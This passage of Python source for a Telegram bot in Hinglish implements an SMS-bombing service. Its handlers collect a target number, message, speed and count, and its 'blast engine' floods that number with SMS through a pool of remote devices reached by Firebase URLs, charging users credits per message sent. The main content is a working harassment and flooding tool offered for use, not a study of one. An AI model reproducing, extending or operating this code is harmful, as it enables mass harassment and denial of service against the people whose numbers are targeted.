    target = int(cq.data.split(":")[2])
    def _a(dd):
        dd.setdefault("approved", [])
        if target not in dd["approved"]:
            dd["approved"].append(target)
    atomic_update(_a)
    await cq.answer(f"✅ {target} approved")
    try:
        await cq.bot.send_message(target,
            f"{em(EMOJI_CHECK, '✅')} <b>You're approved!</b> /start karein.", parse_mode="HTML")
    except: pass
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except: pass


@R.callback_query(F.data.startswith("owner:ban_user:"))
async def owner_ban_user(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    target = int(cq.data.split(":")[2])
    def _b(dd):
        dd.setdefault("banned", [])
        if target not in dd["banned"]:
            dd["banned"].append(target)
    atomic_update(_b)
    await cq.answer(f"🚫 {target} banned")
    try:
        await cq.bot.send_message(target,
            f"{em(EMOJI_CROSS, '🚫')} <b>You have been banned.</b>", parse_mode="HTML")
    except: pass
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except: pass


# ─── force join check ──────────────────────────────────────────
@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await safe_edit(cq.message, force_join_text(missing),
                            reply_markup=force_join_kb(missing),
                            parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    if is_owner(uid, d):
        await send_media_with_caption(cq.bot, cq.message.chat.id, d,
                                      owner_panel_text(d), owner_home_kb_v2(d))
    elif is_admin(uid, d):
        await send_media_with_caption(cq.bot, cq.message.chat.id, d,
                                      admin_panel_text(d), admin_home_kb_v2(d))
    else:
        await send_media_with_caption(cq.bot, cq.message.chat.id, d,
                                      user_home_text_v2(uid, d), user_kb())


# ─── user send flow ───────────────────────────────────────────
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await safe_edit(cq.message, force_join_text(missing),
                        reply_markup=force_join_kb(missing),
                        parse_mode="HTML", disable_web_page_preview=True)
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.send_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML")


@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:cancel")]),
        parse_mode="HTML")


@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML")


@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    smap = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    spd = smap.get(cq.data, SPEED_MEDIUM)
    lbl = "🚀 FAST" if spd == SPEED_FAST else "⚡ MEDIUM" if spd == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=spd)
    await state.set_state(S.send_count)
    devices = get_cached_devices() or await get_all_online_devices(d)
    cnt = len(devices)
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        uc = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{uc}</b>\n"
    await safe_edit(cq.message,
        f"{lbl} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{cnt}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{cnt * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:cancel")]),
        parse_mode="HTML")


@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    spd = fsmd.get("send_speed", SPEED_DEFAULT)
    if not is_admin(uid, d) and not is_owner(uid, d):
        cc = get_user_credits(uid, d)
        if cc <= 0:
            await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>",
                            reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML")
            return
        if count > cc:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Sirf {cc} credits hain! {cc} bhej raha hoon...", parse_mode="HTML")
            count = cc
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!",
                        reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, spd)


# ─── owner send flow ──────────────────────────────────────────
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.owner_send_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>step 1/4 — number</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    n = msg.text.strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML"); return
    await state.update_data(number=n)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{n}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>step 2/4 — message</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Saved!\n\nSelect speed:",
                    reply_markup=speed_kb("owner"), parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    smap = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    spd = smap.get(cq.data, SPEED_MEDIUM)
    await state.update_data(send_speed=spd)
    await state.set_state(S.owner_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await safe_edit(cq.message,
        f"{em(EMOJI_STAR, '📊')} <b>step 4/4 — count</b>\n\n"
        f"🔥 APIs: <b>{len(devices)}</b>\n\nKitne SMS?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer("❌ Sirf number:", parse_mode="HTML"); return
    await state.clear()
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!",
                        reply_markup=kb([("ᴏᴡɴᴇʀ", "owner:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(
        msg.bot, msg, msg.from_user.id,
        fsmd.get("number", ""), fsmd.get("message", ""),
        count, devices, fsmd.get("send_speed", SPEED_DEFAULT))


# ─── admin send flow ──────────────────────────────────────────
@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True); return
    await state.set_state(S.admin_send_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>step 1/4 — number</b>\n\n"
        f"Enter target number:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]),
        parse_mode="HTML")


@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    n = msg.text.strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer("❌ Invalid number. Dobara:", parse_mode="HTML"); return
    if n in PROTECTED_NUMBERS:
        prot = PROTECTED_NUMBERS[n]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != prot:
            await msg.answer(f"{em(EMOJI_LOCK, '🔒')} Ye number protected hai!", parse_mode="HTML"); return
    await state.update_data(number=n)
    await state.set_state(S.admin_send_message)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <code>{mask_number(n)}</code>\n\nMessage?",
                    reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]), parse_mode="HTML")


@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer("Select speed:", reply_markup=speed_kb("admin"), parse_mode="HTML")


@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    smap = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    spd = smap.get(cq.data, SPEED_MEDIUM)
    await state.update_data(send_speed=spd)
    await state.set_state(S.admin_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await safe_edit(cq.message,
        f"📊 step 4/4\n\nAPIs: <b>{len(devices)}</b>\n\nKitne SMS?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]), parse_mode="HTML")


@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer("❌ Sirf number:", parse_mode="HTML"); return
    await state.clear()
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!",
                        reply_markup=kb([("ᴀᴅᴍɪɴ", "admin:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(
        msg.bot, msg, msg.from_user.id,
        fsmd.get("number", ""), fsmd.get("message", ""),
        count, devices, fsmd.get("send_speed", SPEED_DEFAULT))


# ═══════════════════════════════════════════════════════════════════════
# BLAST ENGINE
# ═══════════════════════════════════════════════════════════════════════
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int,
                                      number: str, message: str, count: int,
                                      devices: list, speed: float = SPEED_DEFAULT):
    touch_user_activity(uid)
    await send_random_video(bot, msg.chat.id,
                           caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>",
                    parse_mode="HTML")
                return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        session.blast_data = load()
        USER_SESSIONS[uid] = session

    is_regular = not is_admin(uid, load()) and not is_owner(uid, load())
    cc = get_user_credits(uid, load()) if is_regular else None
    sl = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, cc, sl),
            reply_markup=stop_send_kb(), parse_mode="HTML")
    except Exception as e:
        log.error(f"progress send: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS: del USER_SESSIONS[uid]
        return

    sent_ok = 0; sent_fail = 0; msgs_left = count
    api_usage = {}
    last_update = time.time()
    start = time.time()
    per_fb = {}

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update
        try:
            for device in devices:
                if msgs_left <= 0: break
                async with session.lock:
                    if session.cancelled:
                        log.info(f"user {uid} stopped at {sent_ok+sent_fail}/{count}")
                        break
                fb_id = device["fb_id"]; fb_url = device["fb_url"]
                dev_id = device["dev_id"]; sims = device["sims"]
                slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                quota = min(3, msgs_left); dev_sent = 0

                for sim in slots:
                    async with session.lock:
                        if dev_sent >= quota or msgs_left <= 0 or session.cancelled:
                            break
                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                    async with session.lock:
                        if ok:
                            sent_ok += 1; dev_sent += 1; msgs_left -= 1
                            if is_regular:
                                deduct_credits(uid, 1, session.blast_data)
                                session.blast_data["stats"]["total_sent"] = \
                                    session.blast_data["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in session.blast_data["users"]:
                                    session.blast_data["users"][k]["uses"] = \
                                        session.blast_data["users"][k].get("uses", 0) + 1
                                session.blast_data.setdefault("sms_history", {}) \
                                    .setdefault(str(uid), []).append({
                                        "number": number, "message": message[:100],
                                        "timestamp": int(time.time()), "status": "sent"})
                        else:
                            sent_fail += 1; msgs_left -= 1
                        api_usage.setdefault(fb_id, {"sent": 0, "failed": 0})
                        api_usage[fb_id]["sent" if ok else "failed"] += 1
                        per_fb.setdefault(device["fb_label"], {"sent": 0, "failed": 0})
                        per_fb[device["fb_label"]]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or session.cancelled):
                            live_cc = get_user_credits(uid, load()) if is_regular else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text_v2(sent_ok, sent_fail, count, live_cc, sl,
                                                     elapsed=now - start, per_fb=per_fb),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML")
                            except TelegramBadRequest:
                                pass
                            last_update = now
                    await asyncio.sleep(speed)
        except Exception as e:
            log.error(f"send loop {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular:
        df = session.blast_data or load()
        df["stats"]["total_sent"] = df["stats"].get("total_sent", 0) + sent_ok
        df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
        for fid, dl in api_usage.items():
            df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
            df["stats"]["api_usage"][fid]["sent"] += dl["sent"]
            df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
        k = str(uid)
        if k in df["users"]:
            df["users"][k]["uses"] = df["users"][k].get("uses", 0) + sent_ok
        df.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number, "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"})
        save_now(df)
    else:
        df = session.blast_data or load()
        df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
        for fid, dl in api_usage.items():
            df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
            df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
        save_now(df)

    dlog = load()
    duration = int(time.time() - start)
    log_activity(dlog, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}")
    save_now(dlog)

    try:
        ci = await bot.get_chat(uid)
        u_name = ci.full_name or "Unknown"
        u_uname = f"@{ci.username}" if ci.username else "No Username"
    except Exception:
        u_name = dlog.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    asyncio.create_task(send_channel_log(bot,
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {escape(u_name)}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"📞 <b>Target:</b> <code>{escape(number)}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED' if was_cancelled else 'COMPLETED'}"))

    icon = em(EMOJI_CHECK, "✅") if sent_fail == 0 and sent_ok > 0 else \
           em(EMOJI_WARNING, "⚠️") if sent_ok > 0 else em(EMOJI_CROSS, "❌")
    credit_text = ""
    if is_regular:
        rem = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{rem}</b>"
    stopped = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne stop kiya!</b>" if was_cancelled else ""
    dur = f"\n{em(EMOJI_GEAR, '⏱')} {fmt_duration(int(time.time() - start))}"
    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤", style="success"),
                    btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]
    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(api_usage)}</b>"
            f"{dur}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML")
    except Exception as e:
        log.error(f"final edit: {e}")


@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            await cq.answer("✅ Koi active sending nahi!", show_alert=True); return
        s.cancelled = True
    await cq.answer("🛑 Stop signal bhej diya!", show_alert=True)
    try:
        async with s.lock:
            cs, cf = s.sent, s.failed
        await safe_edit(cq.message,
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"✅ Sent: <b>{cs}</b>\n❌ Failed: <b>{cf}</b>",
            parse_mode="HTML")
    except: pass


# ═══════════════════════════════════════════════════════════════════════
# MEDIA MANAGER
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    videos = d.get("videos", [])
    wv = get_welcome_video(d)
    pc = sum(1 for v in videos if isinstance(v, dict) and v.get("type") == "photo")
    vc = len(videos) - pc
    wv_status = "✅ set" if wv else "❌ not set"
    await safe_edit(cq.message,
        f"{em(EMOJI_VIDEO, '📹')} <b>Media Manager</b>\n\n"
        f"{em(EMOJI_STAR, '🎬')} <b>Welcome video:</b> {wv_status}\n"
        f"{em(EMOJI_GEAR, '🔄')} <b>Rotation pool:</b> {len(videos)} item(s)\n"
        f"   🖼 photos: {pc}  ·  📹 videos: {vc}\n\n"
        f"<i>welcome video /start pe attach hota hai.</i>",
        reply_markup=videos_menu_kb(d), parse_mode="HTML")


@R.callback_query(F.data == "owner:videos:welcome:add")
async def welcome_video_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.welcome_video_add)
    await safe_edit(cq.message,
        f"{em(EMOJI_VIDEO, '📹')} <b>Set Welcome Video</b>\n\n"
        f"Ek photo ya video bhejo jo /start pe attach hoga:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:videos:menu")]),
        parse_mode="HTML")


@R.message(S.welcome_video_add)
async def welcome_video_received(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear(); return
    mt, fid = None, None
    if msg.photo:
        mt, fid = "photo", msg.photo[-1].file_id
    elif msg.video:
        mt, fid = "video", msg.video.file_id
    elif msg.document and msg.document.mime_type:
        if msg.document.mime_type.startswith("video"): mt, fid = "video", msg.document.file_id
        elif msg.document.mime_type.startswith("image"): mt, fid = "photo", msg.document.file_id
    elif msg.text and msg.text.strip():
        mt, fid = "video", msg.text.strip()
    if not fid:
        await msg.answer("❌ Valid photo/video bhejo.", parse_mode="HTML"); return
    await state.update_data(wv_type=mt, wv_file_id=fid)
    await state.set_state(S.welcome_video_spoiler)
    icon = "🖼" if mt == "photo" else "📹"
    await msg.answer(f"{icon} <b>Received!</b>\n\nSpoiler?",
                    reply_markup=kb(
                        [("🙈 ʏᴇs", "owner:videos:welcome:spoiler:yes"),
                         ("👁 ɴᴏ", "owner:videos:welcome:spoiler:no")],
                        [("❌ ᴄᴀɴᴄᴇʟ", "owner:videos:menu")]),
                    parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:videos:welcome:spoiler:yes", "owner:videos:welcome:spoiler:no"}))
async def welcome_video_spoiler_set(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    data = await state.get_data()
    mt = data.get("wv_type"); fid = data.get("wv_file_id")
    if not fid:
        await cq.answer("session expired", show_alert=True); await state.clear(); return
    sp = cq.data.endswith(":yes")
    def _s(dd):
        dd["welcome_video"] = {"type": mt, "file_id": fid, "spoiler": sp}
    atomic_update(_s)
    await state.clear()
    icon = "🖼" if mt == "photo" else "📹"
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>Welcome {icon} saved!</b>\nspoiler: {'🙈 on' if sp else '👁 off'}",
        reply_markup=videos_menu_kb(load()), parse_mode="HTML")


@R.callback_query(F.data == "owner:videos:welcome:view")
async def welcome_video_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    wv = get_welcome_video(d)
    if not wv:
        await cq.answer("❌ not set", show_alert=True); return
    try:
        if wv["type"] == "photo":
            await cq.message.answer_photo(wv["file_id"], caption="👁 <b>Preview</b>",
                parse_mode="HTML", has_spoiler=bool(wv.get("spoiler")))
        else:
            await cq.message.answer_video(wv["file_id"], caption="👁 <b>Preview</b>",
                parse_mode="HTML", has_spoiler=bool(wv.get("spoiler")))
        await cq.answer("sent")
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)


@R.callback_query(F.data == "owner:videos:welcome:del")
async def welcome_video_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    atomic_update(lambda dd: dd.__setitem__("welcome_video", None))
    await cq.answer("🗑 removed")
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_video)
    await safe_edit(cq.message,
        f"{em(EMOJI_VIDEO, '📹')} <b>Add to Rotation</b>\n\nPhoto/video bhejo:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:videos:menu")]),
        parse_mode="HTML")


@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear(); return
    mt, fid = None, None
    if msg.photo: mt, fid = "photo", msg.photo[-1].file_id
    elif msg.video: mt, fid = "video", msg.video.file_id
    elif msg.document and msg.document.mime_type:
        if msg.document.mime_type.startswith("video"): mt, fid = "video", msg.document.file_id
        elif msg.document.mime_type.startswith("image"): mt, fid = "photo", msg.document.file_id
    elif msg.text: mt, fid = "video", msg.text.strip()
    if not fid:
        await msg.answer("❌ Valid photo/video:", parse_mode="HTML"); return
    await state.update_data(pending_media_type=mt, pending_file_id=fid)
    await state.set_state(S.add_media_spoiler_confirm)
    icon = "🖼" if mt == "photo" else "📹"
    await msg.answer(f"{icon} <b>received!</b>\n\nSpoiler?",
                    reply_markup=kb(
                        [("🙈 ʏᴇs", "owner:videos:spoiler:yes"),
                         ("👁 ɴᴏ", "owner:videos:spoiler:no")],
                        [("❌ ᴄᴀɴᴄᴇʟ", "owner:videos:menu")]),
                    parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:videos:spoiler:yes", "owner:videos:spoiler:no"}))
async def owner_videos_spoiler_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fsmd = await state.get_data()
    mt = fsmd.get("pending_media_type"); fid = fsmd.get("pending_file_id")
    if not fid:
        await cq.answer("session expired", show_alert=True); await state.clear(); return
    sp = cq.data.endswith(":yes")
    def _a(dd):
        dd.setdefault("videos", []).append({"type": mt, "file_id": fid, "spoiler": sp})
    atomic_update(_a)
    await state.clear()
    icon = "🖼" if mt == "photo" else "📹"
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>{icon} saved!</b>\nspoiler: {'🙈 on' if sp else '👁 off'}",
        reply_markup=videos_menu_kb(load()), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx); d["videos"] = vids; save_now(d)
        await cq.answer("🗑 removed")
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    d["videos"] = []; save_now(d)
    await cq.answer("🗑 all rotation cleared", show_alert=True)
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not d.get("videos"):
        await cq.answer("❌ koi media nahi", show_alert=True); return
    await cq.answer("📤 sending...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")


# ═══════════════════════════════════════════════════════════════════════
# PROTECTED NUMBERS
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.protect_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\nEnter number to protect:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
